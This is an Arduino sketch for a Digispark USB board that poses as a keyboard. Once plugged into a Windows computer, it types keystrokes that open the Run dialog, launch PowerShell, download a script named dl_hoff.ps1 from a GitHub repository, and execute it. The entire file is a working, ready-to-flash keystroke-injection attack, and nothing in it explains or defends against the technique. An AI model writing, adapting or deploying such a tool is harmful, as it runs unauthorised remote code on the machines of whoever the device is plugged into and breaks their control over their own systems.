#include "DigiKeyboard.h"
void setup() {
  //empty
}

void p(char *line) {
  DigiKeyboard.print(line);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}
 
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  p("powershell");
  p("$client = new-object System.Net.WebClient");
  p("$client.DownloadFile(\"https://github.com/rmilne/hoffer/raw/master/dl_hoff.ps1\", \"dl_hoff.ps1\")");
  p("$f = Get-Content .\\dl_hoff.ps1 -Raw");
  p("$s = [System.Management.Automation.ScriptBlock]::Create($f)");
  p("& $s");
  p("exit");
  for(;;){ /*empty*/ }
}

